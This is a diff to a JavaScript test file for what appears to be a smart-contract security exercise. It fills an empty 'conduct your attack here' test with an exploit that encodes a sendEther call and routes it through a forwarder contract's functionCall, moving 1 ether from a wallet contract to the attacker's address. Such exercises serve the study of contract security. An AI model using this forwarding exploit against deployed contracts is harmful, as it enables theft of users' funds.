@@ -35,8 +35,18 @@ describe(NAME, function () {
         attackerWallet.address
       );
     });
-
-    it("conduct your attack here", async function () {});
+    //console.log(ethers.version);
+    it("conduct your attack here", async function () {
+      let ABI = [
+        "function sendEther(address destination, uint256 amount)"
+      ];
+      let iface = new ethers.utils.Interface(ABI);
+      let data = iface.encodeFunctionData("sendEther", [ attackerWallet.address, ethers.utils.parseEther("1")])
+      await forwarderContract.connect(attackerWallet).functionCall(walletContract.address, data);
+      //function functionCall(address a, bytes calldata data)
+      //abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet.address, ethers.utils.parseEther("1"))
+      //sendEther(address destination, uint256 amount)
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
